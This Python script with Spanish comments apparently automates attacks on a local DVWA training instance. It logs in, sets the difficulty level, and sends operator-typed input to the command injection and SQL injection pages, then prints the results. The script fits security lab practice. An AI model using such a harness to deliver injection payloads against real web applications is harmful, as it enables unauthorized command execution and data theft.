#__Bibliotecas__#
import mechanize
import http.cookiejar as cookies
from bs4 import BeautifulSoup
import sys


#__AUXILIARS__#
def authenticate():
    for form in br.forms():
        if 'login.php' in form.action:
            br.select_form(nr=0)
            br.form['username'] = str(input('[+] Introduzca Ususario\n>>> '))
            br.form['password'] = str(input('\n[+] Introduzca Contraseña:\n>>> '))
            br.submit()
    return True

#__MAIN CODE__ #
# Creamos el objeto navegador
br = mechanize.Browser()

# congiuremos el navegador:
cj = cookies.LWPCookieJar()
br.set_cookiejar(cj)
br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv96.0) Gecko20100101 firefox/96.0')]


#establecemos la url de origen a la que conectarnos
url = sys.argv[1]
# abrimos la primera url
br.open(url)

if authenticate():
    print('Autenticado con éxito!')
    
    # Cambiemos el nivel de seguridad
    br.open('http://localhost:80/security.php')
    br.select_form(nr=0)
    br.form['security'] = [str(input('\n[+] Seleccione Dificultad:\n>>> '))] # porque es un combobox
    print('Nivel de dificultad cambiado.')
    
    # Lancemos el ataque de OS Commanding
    br.open('http://localhost:80/vulnerabilities/exec/')
    br.select_form(nr=0)
    br.form['ip'] = str(input('\n[+] Ataque a lanzar:\n>>> ')) 
    br.submit()
    #leamos y parseemos los contenidos:
    cont = br.response().read() # Lectura
    bs = BeautifulSoup(cont, 'lxml')
    print('[+] Imprimiendo resultados...')
    for line in bs.find_all('pre'):
        print(line)
        
    # lancemos el ataque SQL Injection:
    br.open('http://localhost:80/vulnerabilities/sqli/')
    br.select_form(nr=0)
    br.form['id'] =  str(input('\n[+] Introduzca el comando:\n>>> '))
    br.submit()
    #leamos y parseemos los contenidos:
    cont = cont = br.response().read() # lectura
    bs = BeautifulSoup(cont, 'lxml')
    print('[+] Imprimiendo resultados...')
    for line in bs.find_all('pre'):
        print(str(line).replace('<br/>', '\n'))
    
     
#http://localhost:80/login.php